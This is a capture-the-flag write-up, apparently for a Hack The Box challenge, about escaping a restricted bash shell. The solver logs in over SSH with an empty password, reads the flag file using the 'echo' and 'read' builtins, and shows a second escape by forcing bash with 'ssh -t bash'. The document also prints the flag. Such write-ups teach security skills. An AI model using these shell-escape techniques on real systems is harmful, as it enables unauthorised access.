# Restricted
## Descirption
You 're still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment?

### Difficulty: easy
---
By exploring the provided sshd_config file, we can see for the user restricted we are permitted empty passwords. And so, our entry into the system is through ssh as the user restricted:
```
$ ssh restricted@167.99.86.8 -p 32608
Linux ng-restricted-rtgbl-c6f644c76-t5z7n 5.18.0-0.deb11.4-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.16-1~bpo11+1 (2022-08-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Mar 23 23:40:20 2023 from 167.99.86.8
restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$
```
Upon entry, we can check a few commands and see extremely limited options. We are unable to do traditional navigation commands such as `ls` or `cd`. However, we do have access to other powerful bash builtins such as `echo` and `read`. We can use `echo` to browse directories in a similar manner to `ls`:
```
restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ echo .*
. .. .bash_history .bash_logout .bash_profile .bashrc .bin .profile
```

In our current directory, there is nothing that looks like a flag. Checking elsewhere:
```
restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ echo /*
/bin /boot /dev /etc /flag_8dpsy /home /lib /lib64 /media /memories.dump /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var
```

`flag_8dpsy` looks like a potential candidate. To view, we can leverage `echo` and `read` together:

```
restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ read IFR < /flag_8dpsy; echo $IFR
HTB{r35tr1ct10n5_4r3_p0w3r1355}
```

---
Alternative Method, selecting `bash` as ssh terminal.

User restricted has its default terminal set to rbash, the restricted terminal we previously worked in. However, we can just as easily pick our own terminal agent at ssh launch:

```
$ ssh restricted@167.99.86.8 -p 32608 -t bash
restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ whoami
restricted
restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ cat /flag_8dpsy 
HTB{r35tr1ct10n5_4r3_p0w3r1355}
```
`HTB{r35tr1ct10n5_4r3_p0w3r1355}`